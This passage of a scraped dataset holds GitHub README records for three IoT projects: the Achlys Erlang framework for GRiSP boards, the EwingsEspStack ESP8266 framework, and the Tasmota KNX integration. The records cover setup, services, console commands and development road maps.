"medialink": "Nan", "identifyer": 7000866, "year": null}, {"Unnamed: 0": 871, "autor": 871, "date": null, "content": "Achlys\nThe Achlys framework is a tool designed to help application developers build Erlang/OTP programs using the Lasp libraries and running on GRiSP embedded systems in a wireless sensor network configuration. A more detailed description is available in this document.\nDemonstration (turn on CC !)\nAchlys tasks\nAchlys is being developed in the context of edge computing research within the H2020 LightKone project. The 2 main objectives of the framework are to provide :\nResilient storage across a cluster of IoT sensing devices\nA general purpose task model allowing any function to be propagated and executed in the cluster\nDisclaimer : Achlys is currently under active development, hence a production-ready release is not yet available.\nAchlys is the goddess of deadly poison ... but fortunately there is an AntidoteDB\nMinimum requirements\notp 22.0\nrebar3 3.13.1\ngrisp 1.2.0\nrebar3_grisp 1.3.0\nDevelopment requirements (optional)\ngrisp-software : a fully built grisp toolchain.\ngrisp_tools 0.2.6 or above\npartisan 4.1.0 or above\nlasp 0.10.0 or above\nDeployment guide\nAdditional information on the deployment of GRiSP applications with Achlys can be found below :\nDeployment guide\nExtending Achlys\nAchlys is a framework for generic computations by definition, therefore it can be extented and fine-tuned to turn it into a software that supports any possible application :\nTask Model API example usage\nWiki\nA Wiki is currently being written and will aim at providing a wide range of examples and tutorials in order to demonstrate the capabilities of Lasp on GRiSP at the Edge.\nThe GRiSP Wiki also provides necessary steps in order to setup the required dependencies in order to run Achlys on the GRiSP boards. There are also useful resources that are interesting for general usage of GRiSP boards.\nElixir is also supported on GRiSP, and there two very interesting articles by @Theuns-Botha that provide detailed information on how to setup an Elixir development environment :\nGoing bare metal with Elixir and GRiSP\nIEx Remote Shell into your Elixir driven GRiSP Board\nEDoc preview\nThe development process has not yet reached a level of maturity allowing for an actual release of the program. Therefore, the documentation is currently more of an insight at the software design and more generally at the features that will be provided.\nOnce a satisfactory amount of testing and features will be implemented, a versioned package will be released and the documentation will be a reliable set of specifications.\nThe online version of the documentation is found at :\nHexDocs\nArchitecture\nThe design pattern will follow the \"facade\" concept as much as possible, hence there will be an API that will provide an easy access to all the modules and functions. The documentation will be reorganized to focus on thoroughly explaining the usage, and will regroup the information of submodules like these :\nMind map\nA Mindly reasoning construct. Allows for easier visualization of problems and tasks, hence more efficient solving.\nThe API branch of the map provides a description of some features and simple usage examples.\nFor Achlys, it is currently an additional asset to structure software improvement ideas.\nNOTE : An online interactive version is available here", "link": "https://github.com/achlysproject/achlys", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "achlys\nthe achlys framework is a -----> tool !!!  designed to help application developers build erlang/otp programs using the lasp libraries and running on grisp embedded systems in a wireless sensor network configuration. a more detailed description is available in this document.\ndemonstration (turn on cc !)\nachlys tasks\nachlys is being developed in the context of edge computing research within the h2020 lightkone project. the 2 main objectives of the framework are to provide :\nresilient storage across a cluster of iot sensing devices\na general purpose task model allowing any function to be propagated and executed in the cluster\ndisclaimer : achlys is currently under active development, hence a production-ready release is not yet available.\nachlys is the goddess of deadly poison ... but fortunately there is an antidotedb\nminimum requirements\notp 22.0\nrebar3 3.13.1\ngrisp 1.2.0\nrebar3_grisp 1.3.0\ndevelopment requirements (optional)\ngrisp-software : a fully built grisp toolchain.\ngrisp_tools 0.2.6 or above\npartisan 4.1.0 or above\nlasp 0.10.0 or above\ndeployment guide\nadditional information on the deployment of grisp applications with achlys can be found below :\ndeployment guide\nextending achlys\nachlys is a framework for generic computations by definition, therefore it can be extented and fine-tuned to turn it into a software that supports any possible application :\ntask model api example usage\nwiki\na wiki is currently being written and will aim at providing a wide range of examples and tutorials in order to demonstrate the capabilities of lasp on grisp at the edge.\nthe grisp wiki also provides necessary steps in order to setup the required dependencies in order to run achlys on the grisp boards. there are also useful resources that are interesting for general usage of grisp boards.\nelixir is also supported on grisp, and there two very interesting articles by @theuns-botha that provide detailed information on how to setup an elixir development environment :\ngoing bare metal with elixir and grisp\niex remote shell into your elixir driven grisp board\nedoc preview\nthe development process has not yet reached a level of maturity allowing for an actual release of the program. therefore, the documentation is currently more of an insight at the software design and more generally at the features that will be provided.\nonce a satisfactory amount of testing and features will be implemented, a versioned package will be released and the documentation will be a reliable set of specifications.\nthe online version of the documentation is found at :\nhexdocs\narchitecture\nthe design pattern will follow the \"facade\" concept as much as possible, hence there will be an api that will provide an easy access to all the modules and functions. the documentation will be reorganized to focus on thoroughly explaining the usage, and will regroup the information of submodules like these :\nmind map\na mindly reasoning construct. allows for easier visualization of problems and tasks, hence more efficient solving.\nthe api branch of the map provides a description of some features and simple usage examples.\nfor achlys, it is currently an additional asset to structure software improvement ideas.\nnote : an online interactive version is available here", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000871, "year": null}, {"Unnamed: 0": 872, "autor": 872, "date": null, "content": "EwingsEspStack\nEwings Framework covers all essential things to build ESP8266 IoT applications easily. Basically it is designed on the top of arduino-esp8266 layer to make things easy to understand for developers.\nEwings Esp Framework Structure\nESP8266EX integrates an enhanced version of Tensilica\u2019s L106 Diamond series 32-bit processor, with on-chip SRAM, on top of its Wi-Fi functionalities. Its non-OS SDK provides a set of application programming interfaces (APIs) for core ESP8266 functionalities such as data reception/transmission over Wi-Fi, TCP/IP stack functions, hardware interface functions and basic system management functions.\nArduino has provided user-friendly libraries that use these SDK APIs at bottom. Since arduino has made its easy iot development environment impact over developers, it's easy for them to develop applications with Arduino ide.\nEwings framework sits on the top of these Arduino libraries. So the whole structure looks as shown in the above figure of Ewings Esp8266 Structure.\nInstallation\ninstall from arduino ide\nGoto Tools->Manage Libraries... then in library manager window type esp8266-framework in search bar then from results find esp8266-framework by Suraj I., select latest version and click on install.\ninstall manually\nTo install manually clone or download source, copy folder to esp8266 libraries path ( in windows 10 generally path is like ==> C:\\Users\\suraj\\AppData\\Local\\Arduino15\\packages\\esp8266\\hardware\\esp8266\\2.6.2\\libraries...).\nUsage\nRestart the arduino ide and navigate to File->Examples->esp8266-framework->EwStack example compile and upload.\nNote that installed version of esp8266 should be > 3.0.x. 3.0.2 or greater is recommended. you can check your installed esp8266 version in tools->boards->board manager (type \"esp\" in top search bar).\nafter initializing device completely, check in pc/mobile wifi list if esp8266Stack name appear.\nselect it and enter default password espStack@8266.\nfinally after succesful connectinon to device open browser, type 192.168.0.1 in address bar and press enter\nyou will directed to login screen, enter default username and password ( username: esp8266Stack, password: espStack@8266 )\nnow you will able to see below menu options\nyou can play with all settings. you can modify configs by making changes in files of src/config folder. Go to wifi settings and change the default station ssid, password to connect to your station. you can also change ssid and password for access point. device will reset once after you submit wifi settings, i.e. you have to reconnect device.\nNote that by default session will active for 300 seconds once login, you can change its timeout in server config file.\nServices\nEwings provides some basic services that required to develop simple iot application. All services are available globally to each other. The services are\nHTTP Service: The application can use this rest API service to make HTTP requests such as get, post, etc. this service is just extended version of arduino http client for esp8266.\nNTP Service: This service provides network time to the application.\nMQTT Service: This lightweight messaging protocol can be used to monitor or operate device itself or sensors that are connected to the device. To configure and test MQTT go on device local server and select MQTT section under main menu.\nEvent Service: This service is introduced to handle specific event tasks that should be executed on event arrival. just register the event listener as task to perticular event and fire it when event happens.\nOTA Service: Over The Air (OTA) feature has ability to update the device firmware remotely. By default OTA configurations are accessible with local server. OTA service is uses firmware version to decide whether start to update or not. OTA server can be set in OTA configuration which is accesible through local server.\nwe need to set below route at server\nGET route format as ==> http://server.com/ota?mac_id=xx:xx:xx:xx:xx:xx&version=2019041100 --// this link is called by device on every x seconds provided in OTA configuration with its mac_id and current version ( available in global configuration ) as parameters. Response should be in json as ==> { latest : 2019041101 } which returns latest firmware version available on server\nby default update start only if device current firmware version is older than received firmware version from server.\nwhen device start the update process after knowing its current firmware version is older it looks for the downloadable file from the same server in format given below\nserver address / bin / device mac address / latest firmware version .bin file e.g. http://server.com/bin/xx:xx:xx:xx:xx:xx/2019041101.bin\nESPNOW Service: This service is extended version of ESPNOW feature available in esp8266 with some easy to use api. with help of this feature we can build mesh networking, broadcasting etc n/w as per requirements. this service is not configurable from server for now. but you can manage it with easily available api of this service.\nWiFi Service: This is extended version of arduino wifi library. this service provides simplified api's to dynamically interact with wifi devices on practical field. it has internet based connection ability over same network configs devices which are usefull in mesh scenarios. it also has ability to enable dynamic subnetting heiraechy where each individual device sits in different network and knows how far (in hop distance manner) he is from main hub centre.\nPING Service: As name suggest this service extends basic ping feature of esp8266 sdk api. this service is utilized in wifi service to check active internet.\nGPIO Service: GPIOs are actually going to interact with sensors. We can read sensor or we can drive appliances with the help of this GPIO services.\nMAIL Service: MAIL service is uses SMTP driver to connect and send mail to any account. you should have a SMTP server account credentials that device uses to send mail. to set configuration goto local server and select Email section under main menu. you can test it with tick option provided in email section before submit configuration form. the best demo way to test this section is create free mailtrap account where we get configurations. this service should be enabled from common configuration file wherever this service act as dependency service. for example GPIO alert system has alert channel of email. GPIO alerts generated on user selected alert channel.\nGPIO Alerts: GPIO alerts are provided to get notified on specific condition met. from local server GPIO alert conditions can be set in GPIO alert section which is available under GPIO manage section.\nEwings Local Server\nEsp8266 has built in WiFi feature that work in both station as well as access point mode. Station mode is mode using which we can connect to other wifi network. Access point mode is mode using which Esp8266 create its own network. Ewings stack comes with a local http server facility using access point mode of esp8266. By default this server has setting, monitor pages added.\nEwings Server Framework has following components\nControllers : Controllers used to handle request from client. collecting user inputs, processing, building response for requests etc. works can be carried out in this component.\nMiddlewares : Middlewares used to provide filter like component for all requests. by default only auth middlware checks every request for its session. middlware needs to be assigned to route while registering them in controller.\nSession Handler : Session handler takes care of login sessions. By default, login session expire after 5 minutes.\nRoute Handler : This handles routing operations of the server. It registers a specific controllers method to URL with facility of authentication through middlware.\nEEPROM Database : Esp8266 has software eeprom library that actually uses space in flash memory to store Ewings framework related config data. Server uses this database to fetch and view settings and control panel of device.\nView Helpers : These helpers help to dynamically creates html elements.\nViews : These are static html pages that split into header, middle and footer sections. At the time of sending http response we gathers them to form a complete html page.\nWeb Resources : These are required resources to server framework components.\nFeatures\nEsp8266 has many built in features that will be useful in network applications. Those features are added with Ewings Framework structure.\nNAT : Network address translation (NAT) is a method of remapping one IP address space into another by modifying network address information in the IP header of packets while they are in transit across a traffic routing device. With this feature we can extend station network ( network that has active internet ) range.\nfrom v2.6.^ arduino has provided initial support example of NAT with lwip v2 variant (IPv4 only).\nbefore that lwip 1.4 is used to enable napt ( network address & port transform ) feature but with some customizations in lwip1.4.\nyou can test lwip 1.4 just rename \"...esp8266/tools/sdk/lwip\" with \"...esp8266/tools/sdk/lwip.org\" and copy lwip folder ( in this repo ) there. do not forget to select lwip 1.4 compile from source variant in arduino tools option while building.\nBy default this feature is active based on what lwip variant from ide tool option is selected.\nMESH : This feature easily possible with esp8266 esponow feature. Ewings stack provided basic espnow service to make this available in application where mesh network is required. The basic motive to bring this feature is connectivity.\nUtilities\nThis common section is made to support/help all other section in their operations. This section consists of some most vital libraries that enable services to run in background/periodically. This section is the base for all other section hence all other services are dependent on this section.\nQueue : Queue is dynamic service which enables users to push any data in it and pop it later for use.\nString Helpers : String Helpers helps the user in many string related operations like finding, replacing, JSON parsing, etc.\nScheduler : Scheduler enables the feature of scheduling many things that executes later once or every time on specific intervals/timeouts. Scheduler also accepts priority as parameter for task, where by default big number is kept as big priority.\nReset Factory : This helps to reset the whole device to its default settings in case of device malfunctioning badly. By pressing flash key on device for about 6-7 seconds this service resets all settings to its default one. also this service accept task which should be run while reset factory executing.\nData Type Converters : As name clears the purpose of this utility. It just used to convert the data types from one to another like integer to string and vice versa.\nLogger : Logger enables log on uart0 pins at 115200 baud rate. This is useful in case of debugging application flow.\nDevice Iot (beta)\nAdded example of device iot where internal services take care of publishing/sending payload provided by device to mqtt iot server. currently MQTT server configs for device iot are configured from server with DEVICE_IOT_CONFIG_REQ_URL set in config/DeviceIotConfig.h. to DEVICE_IOT_CONFIG_REQ_URL http server should response the config includes\ntopic\npassword\nkeepalive\ndata rate\nsamples per data\nother configs like\nclientid, username are kept as device mac by default\nhost, port can be configured in config/DeviceIotConfig.h file\nyou can modify them as per requirements\nNote that currently mqtt configs (in config/MqttConfig.h/web portal) are not used for device iot purpose.\nby default this service is disabled. to enable, just uncomment ENABLE_DEVICE_IOT in config/Common.h file\nDetailed Documentation\nDetailed documentation is ongoing..., please visit wiki page....", "link": "https://github.com/Suraj151/esp8266-framework", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "ewingsespstack\newings framework covers all essential things to build esp8266 iot applications easily. basically it is designed on the top of arduino-esp8266 layer to make things easy to understand for developers.\newings esp framework structure\nesp8266ex integrates an enhanced version of tensilica\u2019s l106 diamond series 32-bit processor, with on-chip sram, on top of its wi-fi functionalities. its non-os sdk provides a set of application programming interfaces (apis) for core esp8266 functionalities such as data reception/transmission over wi-fi, tcp/ip stack functions, hardware interface functions and basic system management functions.\narduino has provided user-friendly libraries that use these sdk apis at bottom. since arduino has made its easy iot development environment impact over developers, it's easy for them to develop applications with arduino ide.\newings framework sits on the top of these arduino libraries. so the whole structure looks as shown in the above figure of ewings esp8266 structure.\ninstallation\ninstall from arduino ide\ngoto tools->manage libraries... then in library manager window type esp8266-framework in search bar then from results find esp8266-framework by suraj i., select latest version and click on install.\ninstall manually\nto install manually clone or download source, copy folder to esp8266 libraries path ( in windows 10 generally path is like ==> c:\\users\\suraj\\appdata\\local\\arduino15\\packages\\esp8266\\hardware\\esp8266\\2.6.2\\libraries...).\nusage\nrestart the arduino ide and navigate to file->examples->esp8266-framework->ewstack example compile and upload.\nnote that installed version of esp8266 should be > 3.0.x. 3.0.2 or greater is recommended. you can check your installed esp8266 version in tools->boards->board manager (type \"esp\" in top search bar).\nafter initializing device completely, check in pc/mobile wifi list if esp8266stack name appear.\nselect it and enter default password espstack@8266.\nfinally after succesful connectinon to device open browser, type 192.168.0.1 in address bar and press enter\nyou will directed to login screen, enter default username and password ( username: esp8266stack, password: espstack@8266 )\nnow you will able to see below menu options\nyou can play with all settings. you can modify configs by making changes in files of src/config folder. go to wifi settings and change the default station ssid, password to connect to your station. you can also change ssid and password for access point. device will reset once after you submit wifi settings, i.e. you have to reconnect device.\nnote that by default session will active for 300 seconds once login, you can change its timeout in server config file.\nservices\newings provides some basic services that required to develop simple iot application. all services are available globally to each other. the services are\nhttp service: the application can use this rest api service to make http requests such as get, post, etc. this service is just extended version of arduino http client for esp8266.\nntp service: this service provides network time to the application.\nmqtt service: this lightweight messaging protocol can be used to monitor or operate device itself or sensors that are connected to the device. to configure and test mqtt go on device local server and select mqtt section under main menu.\nevent service: this service is introduced to handle specific event tasks that should be executed on event arrival. just register the event listener as task to perticular event and fire it when event happens.\nota service: over the air (ota) feature has ability to update the device firmware remotely. by default ota configurations are accessible with local server. ota service is uses firmware version to decide whether start to update or not. ota server can be set in ota configuration which is accesible through local server.\nwe need to set below route at server\nget route format as ==> http://server.com/ota?mac_id=xx:xx:xx:xx:xx:xx&version=2019041100 --// this link is called by device on every x seconds provided in ota configuration with its mac_id and current version ( available in global configuration ) as parameters. response should be in json as ==> { latest : 2019041101 } which returns latest firmware version available on server\nby default update start only if device current firmware version is older than received firmware version from server.\nwhen device start the update process after knowing its current firmware version is older it looks for the downloadable file from the same server in format given below\nserver address / bin / device mac address / latest firmware version .bin file e.g. http://server.com/bin/xx:xx:xx:xx:xx:xx/2019041101.bin\nespnow service: this service is extended version of espnow feature available in esp8266 with some easy to use api. with help of this feature we can build mesh networking, broadcasting etc n/w as per requirements. this service is not configurable from server for now. but you can manage it with easily available api of this service.\nwifi service: this is extended version of arduino wifi library. this service provides simplified api's to dynamically interact with wifi devices on practical field. it has internet based connection ability over same network configs devices which are usefull in mesh scenarios. it also has ability to enable dynamic subnetting heiraechy where each individual device sits in different network and knows how far (in hop distance manner) he is from main hub centre.\nping service: as name suggest this service extends basic ping feature of esp8266 sdk api. this service is utilized in wifi service to check active internet.\ngpio service: gpios are actually going to interact with sensors. we can read sensor or we can drive appliances with the help of this gpio services.\nmail service: mail service is uses smtp driver to connect and send mail to any account. you should have a smtp server account credentials that device uses to send mail. to set configuration goto local server and select email section under main menu. you can test it with tick option provided in email section before submit configuration form. the best demo way to test this section is create free mailtrap account where we get configurations. this service should be enabled from common configuration file wherever this service act as dependency service. for example gpio alert system has alert channel of email. gpio alerts generated on user selected alert channel.\ngpio alerts: gpio alerts are provided to get notified on specific condition met. from local server gpio alert conditions can be set in gpio alert section which is available under gpio manage section.\newings local server\nesp8266 has built in wifi feature that work in both station as well as access point mode. station mode is mode using which we can connect to other wifi network. access point mode is mode using which esp8266 create its own network. ewings stack comes with a local http server facility using access point mode of esp8266. by default this server has setting, monitor pages added.\newings server framework has following components\ncontrollers : controllers used to handle request from client. collecting user inputs, processing, building response for requests etc. works can be carried out in this component.\nmiddlewares : middlewares used to provide filter like component for all requests. by default only auth middlware checks every request for its session. middlware needs to be assigned to route while registering them in controller.\nsession handler : session handler takes care of login sessions. by default, login session expire after 5 minutes.\nroute handler : this handles routing operations of the server. it registers a specific controllers method to url with facility of authentication through middlware.\neeprom database : esp8266 has software eeprom library that actually uses space in flash memory to store ewings framework related config data. server uses this database to fetch and view settings and control panel of device.\nview helpers : these helpers help to dynamically creates html elements.\nviews : these are static html pages that split into header, middle and footer sections. at the time of sending http response we gathers them to form a complete html page.\nweb resources : these are required resources to server framework components.\nfeatures\nesp8266 has many built in features that will be useful in network applications. those features are added with ewings framework structure.\nnat : network address translation (nat) is a method of remapping one ip address space into another by modifying network address information in the ip header of packets while they are in transit across a traffic routing device. with this feature we can extend station network ( network that has active internet ) range.\nfrom v2.6.^ arduino has provided initial support example of nat with lwip v2 variant (ipv4 only).\nbefore that lwip 1.4 is used to enable napt ( network address & port transform ) feature but with some customizations in lwip1.4.\nyou can test lwip 1.4 just rename \"...esp8266/tools/sdk/lwip\" with \"...esp8266/tools/sdk/lwip.org\" and copy lwip folder ( in this repo ) there. do not forget to select lwip 1.4 compile from source variant in arduino tools option while building.\nby default this feature is active based on what lwip variant from ide -----> tool !!!  option is selected.\nmesh : this feature easily possible with esp8266 esponow feature. ewings stack provided basic espnow service to make this available in application where mesh network is required. the basic motive to bring this feature is connectivity.\nutilities\nthis common section is made to support/help all other section in their operations. this section consists of some most vital libraries that enable services to run in background/periodically. this section is the base for all other section hence all other services are dependent on this section.\nqueue : queue is dynamic service which enables users to push any data in it and pop it later for use.\nstring helpers : string helpers helps the user in many string related operations like finding, replacing, json parsing, etc.\nscheduler : scheduler enables the feature of scheduling many things that executes later once or every time on specific intervals/timeouts. scheduler also accepts priority as parameter for task, where by default big number is kept as big priority.\nreset factory : this helps to reset the whole device to its default settings in case of device malfunctioning badly. by pressing flash key on device for about 6-7 seconds this service resets all settings to its default one. also this service accept task which should be run while reset factory executing.\ndata type converters : as name clears the purpose of this utility. it just used to convert the data types from one to another like integer to string and vice versa.\nlogger : logger enables log on uart0 pins at 115200 baud rate. this is useful in case of debugging application flow.\ndevice iot (beta)\nadded example of device iot where internal services take care of publishing/sending payload provided by device to mqtt iot server. currently mqtt server configs for device iot are configured from server with device_iot_config_req_url set in config/deviceiotconfig.h. to device_iot_config_req_url http server should response the config includes\ntopic\npassword\nkeepalive\ndata rate\nsamples per data\nother configs like\nclientid, username are kept as device mac by default\nhost, port can be configured in config/deviceiotconfig.h file\nyou can modify them as per requirements\nnote that currently mqtt configs (in config/mqttconfig.h/web portal) are not used for device iot purpose.\nby default this service is disabled. to enable, just uncomment enable_device_iot in config/common.h file\ndetailed documentation\ndetailed documentation is ongoing..., please visit wiki page....", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000872, "year": null}, {"Unnamed: 0": 903, "autor": 903, "date": null, "content": "Tasmota KNX\nTasmota_KNX was a modification for Tasmota to add a basic functionality of the KNX IP Protocol (Multicast). Now it is integrated in Tasmota!\nThis repository is for developing new KNX features for Tasmota.\nIf you like Tasmota KNX, give it a star or fork it and contribute!\nAny help or comment is very welcome.\nTable of Contents\nKNX Explanation\nIntegration\nRequirements\nFirmware\nUsage Examples\nConsole Commands\nDevelopment Road Map\nModifications to Tasmota\nContributors\nTasmota Readme\nKNX Explanation\nThe KNX IP Protocol is an international open standard for smart homes and smart buildings automation. It is a decentralized system. Each device can talk directly to each other without the need of a central controller or server. Any panel or server is just for telesupervision and for sending requests. KNX IP Protocol uses a UDP multicast on 224.0.23.12 : 3671, so there is no need for a KNX Router unless you want to communicate to KNX Devices that are not in the WIFI Network (Twisted Pair, RF, Powerline).\nEach device has a physical address (like a fixed IP) as 1 . 1 . 0 and that address is used for configuration purposes.\nEach device can be configured with group addresses as 2 / 2 / 1 and that address can be used for sending/receiving commands. So, for example, if 2 devices that are configured with the 2 / 2 / 1 for turning on/off their outputs, and other device send Turn ON command to 2 / 2 / 1, both devices will turn on their outputs.\nIntegration\nSeveral home automation systems have KNX support. For example, Home Assistant has a XKNX Python Library to connect to KNX devices using a KNX Router. If you don't have a KNX Router, you can use a Software KNX Router like KNXd on the same Raspberry Pi than Home Assistant. KNXd is used by Home Assistant for reading this UDP Multicast, although KNXd has other cool features that need extra hardware like connect to KNX devices by Twister Pair, Power Line or RF.\nIf using the Home Assistant distribution called Hassio, everything for KNX is already included by default.\nIf you use the ETS (KNX Configurator Software) you can add any Tasmota KNX as a dummy device.\nRequirements\nAll the libraries required for Tasmota are here along with the extra required for the KNX Driver:\nESP KNX IP Library. A copy of this modified library is also available here. The original is here.\nEsp8266 board libraries:\nv2.7.4.7 Works fine. No known issues. (RECOMMENDED) (Support for old libraries have been dropped)\nEsp32 board libraries:\nv1.0.4.2 Works fine. No known issues. (RECOMMENDED) (Support for old libraries have been dropped)\nFirmware\nYou can download the precompiled binaries for flashing ESP8266, ESP8285 and ESP32 devices from:\nLatest Release\nLatest development version from Build_Output folder.\nOr if you need any other feature enabled or disabled, or a different Arduino core, you can use TasmoCompiler (readme) or you can modify the my_user_config.h file and build your firmware as explained in the docs.\nImplemented Features\nThe implemented features (up to now) in KNX for Tasmota are:\nGeneral:\nButtons (just push)\nRelays (on/off/toggle)\nLights (led strips, etc. but just on/off)\nSensor lists that you can use in KNX is (only one sensor per type):\nTemperature\nHumidity\nEnergy (v, i, power)\nFeatures that can be used with Tasmota's rules:\nSend KNX command (on/off)\nReceive KNX command (on/off)\nSend values by KNX (any float type, temperature for example)\nReceive values by KNX (any float type, temperature for example)\nSend KNX Scenes (on/off)\nReceive KNX Scenes (on/off)\nReceive a KNX read request\nView/Set the Physical Address\nView/Set Group Address to send data\nView/Set Group Address to receive data\nUsage Examples\nThere are multiple possible configurations. Here are explained just a few as example. The options for selecting relays, buttons, sensors, etc. are only available if were configured on Configure Module Menu.\nTo configure KNX, enter on the Configuration Menu of Tasmota and select Configure KNX.\nNote on KNX communication enhancement option: As Wifi Multicast communication is not reliable in some wifi router due to IGMP problems or Snooping, an enhancement was implemented. This option increase the reliability by reducing the chances of losing telegrams, sending the same telegram 3 times. In practice it works really good and it is enough for normal home use. When this option is on, Tasmota will ignore toggle commands by KNX if those are sent more than 1 toggle per second. Just 1 toggle per second is working fine.\n1) Setting Several Tasmotas to be controlled as one by a Home Automation System:\nWe can set one of the group address to be the same in all the devices so as to turn them on or off at the same time. In this case, so as to inform the status of all the relays to the Automation System, just one of the devices have to be configured as the responder. If you use the same Group Address for sending and receiving, you have to take into account not to make loops.\nDEVICE 1\nDEVICE 2\n2) Setting 2 Tasmotas to be linked as stair lights:\nWe can set one device to send the status of its output and another to read that and follow. And the second device can send the status of its button and the first device will toggle. With this configuration we can avoid to make a loop.\nDEVICE 1\nDEVICE 2\n3) Setting a button as initiator of a scene:\nJust setting one device to send the push of a button, and the rest just use that value to turn them on. In this case, there is no toggle. Every time the button is pushed, the turn on command is sent.\nDEVICE 1\nDEVICE 2\n4) Setting a Temperature sensor:\nWe can configure to send the value of temperature or humidity every teleperiod. This teleperiod can be configured. See Tasmota wiki. It is recommended also to set the reply temperature address.\n5) Using rules:\nMore functionality can be added to Tasmota using rules.\nIn the KNX Menu, can be set a Group Address to send data or commands by rules, as KNX TX1 to KNX TX5\nIn rules we can use the command KnxTx_Cmnd1 1 to send an ON state command to the group address set in KNX TX1 slot of the KNX menu. Also, we can use the command KnxTx_Val1 15 to send a 15 value to the group address set in KNX TX1 slot of the KNX menu.\nIn the KNX Menu can be set a Group Address to receive commands by rules as KNX RX1 to KNX RX5\nIn rules we can use the events to catch the reception of COMMANDS from KNX to those RX Slots.\nExample: rule on event#knxrx_cmnd1 do var1 %value% endon to store the command received in the variable VAR1\nIn rules we can use the events to catch the reception of VALUES from KNX to those RX Slots.\nExample: rule on event#knxrx_val1 do var1 %value% endon to store the value received in the variable VAR1\nAlso, if a Read request is received from KNX Network, we can use that in a rule as for example: rule on event#knxrx_req1 do knxtx_val1 %var3% endon\nConsole Commands\nCommand Payload Description\nKnxTx_Cmnd<x> 0 / 1 Send KNX Commands using the Group Address set on KNX Menu at KNX_TX<x> slot\nKnxTx_Val<x> value Send KNX float values using the Group Address set on KNX Menu at KNX_TX<x> slot\nKNX_ENABLED View Status of KNX Communications\n0 / 1 0 - Set Disable to KNX Communications / 1 - Set Enable to KNX Communications\nKNX_ENHANCED View Status of Enhanced mode for KNX Communications\n0 / 1 0 - Set to Disable / 1 - Set to Enable Enhanced KNX Communications Mode\nKNX_PA View the device KNX Physical Address (0.0.0 means not set)\n<x>.<x>.<x> Set the device KNX Physical Address (like 1.1.0)\nKNX_GA View the number of Group Address Configured to Send Data/Commands\n<x> View the configuration for the Group Address number x Send Data/Commands\nKNX_GA<x> <y>,<z>,<z>,<z> Set the Group Address number <x> to Send Data/Commands\n<y> is the parameter OPTION to send its status to the Group Address\n<z>,<z>,<z> is the Group Address number to Send Data/Commands\nKNX_CB View the number of Group Address Configured to Receive Data/Commands\n<x> View the configuration for the Group Address number x to Receive Data/Commands\nKNX_CB<x> <y>,<z>,<z>,<z> Set the Group Address number <x> to ReceiveData/Commands\n<y> is the parameter OPTION to Receive its status from the Group Address\n<z>,<z>,<z> is the Group Address number to Receive Data/Commands\nPosible values for the parameter OPTION:\nOPTION Value Device Parameter\n1 Relay 1\n2 Relay 2\n3 Relay 3\n4 Relay 4\n5 Relay 5\n6 Relay 6\n7 Relay 7\n8 Relay 8\n9 Button 1\n10 Button 2\n11 Button 3\n12 Button 4\n13 Button 5\n14 Button 6\n15 Button 7\n16 Button 8\n17 TEMPERATURE\n18 HUMIDITY\n19 ENERGY_VOLTAGE\n20 ENERGY_CURRENT\n21 ENERGY_POWER\n22 ENERGY_POWERFACTOR\n23 ENERGY_DAILY\n24 ENERGY_START\n25 ENERGY_TOTAL\n26 KNX_SLOT1\n27 KNX_SLOT2\n28 KNX_SLOT3\n29 KNX_SLOT4\n30 KNX_SLOT5\n31 KNX_SCENE\n255 EMPTY\nDevelopment Road Map\nFor Tasmota_KNX:\nAdd Web Menu\nAdd Feature to Receive telegrams and modify Relay Status\nAdd Feature to Receive telegrams from multiple Group Addresses to modify just one relay status (useful for scenes)\nAdd Feature to Send telegrams of relay status change\nAdd Feature to Send telegrams of one relay status to multiple Group Addresses (useful for scenes)\nAdd Feature to Send telegrams of button pressed\nAdd Feature to receive telegrams to toggle relay status\nAdd Feature to read Temperature, Humidity from Tasmota\nAdd Feature to send Temperature, Humidity by a set interval (tasmota teleperiod)\nAdd Feature to receive command to read temperature, Humidity\nAdd Feature to recognize Tasmota config to show the same number of relays, buttons, etc.\nAdd Feature to Save Config\nAdd Feature to Load Config\nAdd Log Info\nComplete all the language files with keys\nAdd support for other output devices supported by Tasmota\nAdd support for other sensors supported by Tasmota (TEMP, HUM, ENERGY)\nAdd commands for rules to send values and commands by KNX\nAdd commands for rules to set KNX Configurations\nAdd events for rules when receiving data from KNX and read requests\nAdd option for increase communication reliability (re send telegrams)\nAdd Scenes support\nAdd Dimmer support\nAdd Color support\nAdd Shutters support\nOptimize code to reduce Flash and RAM - Refactor Driver and Library\nAdd option to support ETS Programming\nAdd option for KNXnet/IP Tunneling\nModifications to Tasmota\nAdded the file /tasmota/xdrv_11_KNX.ino\nAdded the entries #define USE_KNX and #define USE_KNX_WEB_MENU on /tasmota/my_user_config.h\nAdded entries to the file /tasmota/xdrv_01_webserver.ino\nAdded entries to the file /tasmota/tasmota.ino\nAdded entries to the file /tasmota/tasmota.h\nAdded entries to the file /tasmota/settings.h\nAdded entries to the file /tasmota/support.ino\nAdded entries to sensor files\nAdded entries to language files\nUp to now, enabling KNX uses +9.4 KB of code and +3.7 KB of memory for Tasmota. If it is enabled also the KNX Web Menu, it adds +8.3 KB more of code and +144 Bytes more of memory.\nThere is NO CONFLICT with MQTT, Home Assistant, Web, etc. Tests show fast response of all features running at same time.\nContributors\nascillato ( Adrian Scillato )\nsisamiwe - Thanks for the guide on using KNX and software testing and support\nenvy ( Nico Weichbrodt ) - Thanks for the patience and help with the modifications to ESP_KNX_IP.\narendst ( Theo Arends ) - Thanks for the guide on Tasmota and for the ideas.\njohannesbonn - Thanks for the patience on bug resolutions\nRocketSience - Thanks for the patience on bug resolutions\njeylites - Thanks for the patience on bug resolutions\nWinni66 - Thanks for the patience on bug resolutions\nmisc2000 - Thanks for the testing on bug resolutions\nmizrachiran ( Ran Mizrachi ) - Thanks for the testing on bug resolutions\nsmurfix ( Matthias Urlichs ) - Thanks for the KNX guiding and KNXd use.\nAnd many others providing testing, bug reporting and feature requests.\nTasmota Readme\nAlternative firmware for ESP8266 and ESP32 based devices with easy configuration using webUI, OTA updates, automation using timers or rules, expandability and entirely local control over MQTT, HTTP, Serial or KNX. Written for PlatformIO with limited support for Arduino IDE.\nIf you like Tasmota, give it a star, or fork it and contribute!\nSee RELEASENOTES.md for release information.\nIn addition to the release webpage the binaries can also be 